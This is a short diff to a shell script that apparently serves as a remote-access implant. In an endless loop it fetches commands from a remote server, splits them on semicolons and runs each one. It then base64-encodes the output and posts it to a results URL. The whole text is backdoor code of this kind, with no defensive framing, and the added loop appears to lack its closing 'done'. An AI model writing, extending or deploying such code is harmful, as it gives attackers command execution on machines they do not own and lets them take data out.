@@ -15,8 +15,12 @@ resultl="http://$ip:$port/Lin-results/$name/"
 
 while :
 do  
-   
-    echo $($(curl $taskl)|base64) > /tmp/result
+    tasks=$(curl $taskl)
+    splittasks=$(echo $tasks | tr ";" "\n")
+    for task in $splittasks
+    do
+        echo $($task|base64) >> /tmp/result
     curl -X POST --data "@/tmp/result" $resultl
     sleep $n
+    rm /tmp/result
 done
